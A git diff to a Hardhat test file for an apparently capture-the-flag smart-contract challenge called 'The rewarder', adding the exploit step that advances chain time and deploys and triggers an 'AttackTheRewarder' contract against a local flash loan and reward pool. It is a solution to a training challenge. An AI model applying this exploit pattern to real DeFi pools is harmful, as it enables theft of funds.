@@ -1,6 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
+
 describe('[Challenge] The rewarder', function () {
 
     let deployer, alice, bob, charlie, david, attacker;
@@ -66,6 +67,12 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const AttackFactory = await ethers.getContractFactory('AttackTheRewarder', attacker);
+        this.attack = await AttackFactory.deploy(this.flashLoanPool.address, this.rewardToken.address, this.liquidityToken.address, this.rewarderPool.address);
+
+        await this.attack.connect(attacker).attackTheRewarder();
+
     });
 
     after(async function () {
